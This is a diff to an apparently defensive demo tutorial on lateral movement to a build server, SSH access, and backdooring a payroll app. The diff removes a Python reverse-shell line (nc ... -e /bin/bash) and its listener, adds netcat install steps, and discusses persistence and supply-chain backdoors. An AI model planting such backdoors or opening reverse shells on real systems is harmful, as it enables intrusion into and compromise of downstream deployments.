@@ -45,7 +45,7 @@ So now, we can connect to the build server:
 
 ```sh
 # note: use the command that appeared in your history for a valid user/IP
-ssh -i ~/.ssh/buildbox_id root@203.0.113.45
+ssh -i ~/.ssh/buildbox_id JUMPSERVER_USER@JUMPSERVER_IP
 ```
 
 If we look at the history, we can see some of the old packages that were built here:
@@ -93,7 +93,14 @@ cat payroll-app/Makefile
 
 Given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package.
 
-As an example, let's install netcat for setting up a reverse shell:
+As an example, let's install netcat for setting up a reverse shell (depending on your operating system).
+
+For Ubuntu:
+
+```sh
+sudo apt install ncat
+```
+For AWS (or other Redhat based OSs):
 
 ```sh
 sudo yum install nmap-ncat
@@ -102,22 +109,16 @@ sudo yum install nmap-ncat
 And validate that we can use `nc`:
 
 ```sh
-nc --version
+which nc
 ```
 
-Then, we can edit the payroll app to give us the backdoor, such as connecting to this machine with a reverse shell.
+## Discussion
 
-```py
-# file: payroll-app/payroll-calc.py
-# ...
-import os; os.system("nc 203.0.113.45 2222 -e /bin/bash")
-```
+At this point, we have completed the lateral movement exploit. If the attacker were to continue, there are a few different options.
 
-For this demo, the buildbox is not actually set up to generate new images, but at this point is where we would build the new image, start a listening server, and wait for someone to deploy the backdoor:
+First, they could install a persistence method, such as the ones detailed in [this blog by Linode](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/). Examples include adding a new user, editing shell configurations files, creating cron jobs, or making new linux services.
 
-```sh
-nc -l -p 2222
-```
+After ensuring they can return to the build machine, the attacker could edit the payroll app to install a backdoor. This backdoor wouldn't be run on the build machine, but would be installed the next time the payroll app was deployed, allowing the attacker to pivot to the new machine or cluster it was deployed to.
 
 To see a full supply-chain exploitation and how Spyderbat detects it, visit the [supply chain attack demo](../supply_chain/).
 
@@ -143,6 +144,10 @@ Now that we know the attacker's method of access and persistence method, we can 
 - rotate both machines' SSH keys
 - remove the backdoor from the payroll-prod system.
 - remove netcat from the build system
+
+> **Note:**
+>
+> The uninstall script can automatically perform some of these clean up actions, if necessary.
 
 ## Further Reading
 
